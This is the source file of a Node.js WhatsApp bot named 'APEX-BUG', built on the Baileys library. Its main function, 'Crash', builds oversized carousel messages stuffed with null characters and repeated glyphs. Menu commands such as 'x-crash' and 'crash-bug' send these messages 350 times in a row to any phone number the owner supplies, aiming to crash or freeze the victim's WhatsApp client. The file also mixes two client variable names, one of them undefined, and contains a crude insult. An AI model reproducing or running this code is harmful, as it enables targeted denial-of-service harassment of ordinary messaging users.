/*
Base Script Bot Whatsapp By kipli official
*/
require('./config');
const fs = require('fs');
const util = require('util');
const { exec } = require("child_process");
const chalk = require('chalk');
const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = require('@whiskeysockets/baileys');

// Fonction sleep
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Fonction runtime
const runtime = (seconds) => {
    seconds = Number(seconds);
    const d = Math.floor(seconds / (3600 * 24));
    const h = Math.floor(seconds % (3600 * 24) / 3600);
    const m = Math.floor(seconds % 3600 / 60);
    const s = Math.floor(seconds % 60);
    return `${d > 0 ? d + 'd ' : ''}${h}h ${m}m ${s}s`;
};

module.exports = async (minato, m) => {
try {
// Fonction reply locale
const reply = (text) => minato.sendMessage(m.chat, { text }, { quoted: m });

const body = (
(m.mtype === 'conversation' && m.message.conversation) ||
(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
) ? (
(m.mtype === 'conversation' && m.message.conversation) ||
(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
) : '';

const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1);
const text = q = args.join(" ");
const sender = m.key.fromMe ? (minato.user.id.split(':')[0] + '@s.whatsapp.net' || minato.user.id) : (m.key.participant || m.key.remoteJid);
const botNumber = await minato.decodeJid(minato.user.id);
const senderNumber = sender ? sender.split('@')[0] : '';
const isCreator = (m && m.sender && [botNumber, ...(global.owner || [])].map(v => v.toString().replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`;
const isBot = botNumber ? botNumber.includes(senderNumber) : false;

//[ BUG FUNCTIONS ]
async function Crash(target) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "\u0000".repeat(10000),
          "body": "\u0000".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "APEX-BUG " + "ꦾ".repeat(11000)
        },
        "footer": {
          "text": "</> 𝙼UUOJ 𝙳𝙴𝚅 "
        },
        "header": { 
          "title": 'vagina😵😵😵😵' + "\u0000".repeat(50000),
          "hasMediaAttachment": true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(target, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻 " + "ꦾ".repeat(55000)
            },
            "footer": {
              "text": "( 🐉 ) MinatoNotDev ( 🐉 )"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await minato.relayMessage(target, carousel.message, {
      messageId: carousel.key.id
    });
  }
}

switch(command) {
case "menu": {
let menu = `Hello *${pushname}*.

▢ _BotName_ : *APEX-BUG*
▢ _Version_ : *1.0*
▢ _Author_ : *Muuoj Dev*

☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱
 \`[ ∆ ] Owner Menu\`
▢ self
▢ public
☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱
 \`[ ∆ ] Android Bug\`
▢ crash-beta
▢ X-andro
▢ bug-delay
▢ crash-bug
▢ x-crash
☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱
 \`[ ∆ ] No Room For The Weak\`
▢ _Apex-Bug_
▢ _Muuoj Dev_ <Dev> ( Only Strong To SUrvive)
☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱☱`;
muuoj.sendMessage(m.chat, {
  image: { url: `https://files.catbox.moe/k2lcvt.jpg`},
  caption: menu,
  footer: "© 𝐅𝐎𝐑𝐂𝐄",
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    externalAdReply: {
       title: `Crash — Assistant`,
       body: `${runtime(process.uptime())}`,
       thumbnailUrl: `https://files.catbox.moe/k2lcvt.jpg`,
       sourceUrl: `https://youtube.com/@Hacker-Malware`,
       mediaType: 1,
       renderLargerThumbnail: true
      },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363419855570475@newsletter",
      serverMessageId: 1,
      newsletterName: "</> MUUOJ 𝙳𝙴𝚅"
    }
  }
}, { quoted: m });

await muuoj.sendMessage(m.chat, {
    audio: { url: 'https://files.catbox.moe/5mhbx6.mp3' },
    mimetype: 'audio/mp4',
    ptt: false
  }, { quoted: m });
}
break;

//======================[ BUG MENU ]===============================================================//
case 'crash-beta':
case 'bug-delay': 
case 'crash-bug':
case 'x-crash': { // BUG CRASH
if (!isCreator) return reply("Only premium");
    if (!q) return reply(`Example :\n ${prefix + command} 242xx / @tag`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return reply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${prefix + command} 242xxxx`);
    }

    let target = jidx + "@s.whatsapp.net";
    await muuoj.sendMessage(m.chat, { react: { text: "☠️", key: m.key }}); 
    const targetnye = `⨭ *SUCCESS SEND BUG TO TARGET.*\n\n— *STATUS:*
⭔ Target : *${jidx}*
⭔ Creator : *</> MUUOJ 𝙳𝙴𝚅*
⭔ Status : *Success!*`;
    let msgii = generateWAMessageFromContent(m.chat, {
         viewOnceMessage: { 
            message: { 
                "messageContextInfo": { 
                    "deviceListMetadata": {}, 
                    "deviceListMetadataVersion": 2
                }, 
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: { 
                        mentionedJid: [m.sender] 
                    }, 
                    body: proto.Message.InteractiveMessage.Body.create({ 
                        text: `APEX`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                    text: `© Crash – Assistant`
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: "https://img1.pixhost.to/images/5628/596704603_skyzopedia.jpg" } }, { upload: minato.waUploadToServer })),
                    title: ``,
                    gifPlayback: true,
                    subtitle: ``,
                    hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": JSON.stringify({
                                    "display_text": "Info Update",
                                    "url": `https://whatsapp.com/channel/0029VbDVwbQICVffzTB4Qd0H`,
                                    "merchant_url": `www.google.com`,
                                })
                            }
                        ]
                    })
                })
            }
        }
    }, {userJid: m.sender, quoted: m}); 
    await minato.relayMessage(msgii.key.remoteJid, msgii.message, { messageId: msgii.key.id });
    for (let i = 0; i < 350; i++) {
        await Crash(target);
        await sleep(1000);
    }
  console.log(chalk.red.bold("Success Send Bug To Target"));
}
break;

//======================[ OWNER MENU ]===============================================================//
case 'public': { 
    if (!isCreator) return reply("Owner only");
    muuoj.public = true;
    reply(`*Bot name* Mode *Public*`);
}
break;

case 'self': {    
    if (!isCreator) return reply("Owner only"); 
    muuoj.public = false;
    reply(`*Bot name* Mode *Self*`);
}
break;

default:
}
} catch (err) {
console.log(util.format(err));
}
};

//~~~~~Status~~~~~//
let file = require.resolve(__filename);
fs.watchFile(file, () => {
fs.unwatchFile(file);
console.log(`Update ${__filename}`);
delete require.cache[file];
require(file);
});
